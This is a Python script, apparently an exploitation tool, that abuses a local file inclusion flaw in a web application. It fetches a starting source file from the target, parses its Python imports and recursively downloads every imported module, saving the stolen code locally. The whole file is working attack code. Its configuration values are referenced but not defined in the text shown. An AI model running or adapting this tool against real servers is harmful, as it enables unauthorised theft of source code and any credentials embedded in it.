import ast
import requests
import os
from pathlib import Path
from argparse import ArgumentParser


def leak_file(file_path: str | Path):
    if DATA:
        data = DATA.replace('LFI', file_path)
        res = requests.post(LFI_URL, headers=HEADERS, data=data)
    else:
        res = requests.get(LFI_URL + file_path, headers=HEADERS)
    if res.status_code != 200 or res.text.startswith("<!DOCTYPE html>"):
        return None
    saved_file = Path(root / file_path)
    saved_file.parent.mkdir(exist_ok=True, parents=True)
    with open(saved_file, 'w') as f:
        f.write(res.text)
    print(f"[*] Found {file_path}", flush=True)
    return saved_file


def parse_imports(file_path):
    with open(file_path, 'r') as f:
        node = ast.parse(f.read())
    imports = {}

    def traverse(node):
        if isinstance(node, ast.ImportFrom):
            module = node.module
            if module is not None:
                imports[module] = imports[module] if module in imports else []
                for alias in node.names:
                    imports[module].append(alias.name)
        elif isinstance(node, ast.Import):
            for alias in node.names:
                imports[alias.name] = None
        elif isinstance(node, ast.FunctionDef):
            for n in ast.walk(node):
                if isinstance(n, (ast.Import, ast.ImportFrom)):
                    traverse(n)

    for n in node.body:
        traverse(n)

    return imports


def convert_imports(imports: dict[str, str]):
    converted = []
    for key, val in imports.items():
        path = key.replace('.', '/')
        converted.append(path + '.py')
        if val is None:
            continue
        for v in val:
            sub_path = f'{path}/{v}.py'
            converted.append(sub_path)
    return converted


def run_recurse(path):
    file_path = leak_file(path)
    if file_path is not None:
        imports = parse_imports(file_path)
        if len(imports.items()) != 0:
            paths = convert_imports(imports)
            for p in paths:
                file_path = format_path(p)
                if Path(root / file_path).exists():
                    continue
                run_recurse(file_path)

def format_path(path: str):
    path = path.replace(PACKAGE_NAME, "")
    return path.removeprefix("/")

def dump():
    run_recurse(MAIN_FILE)
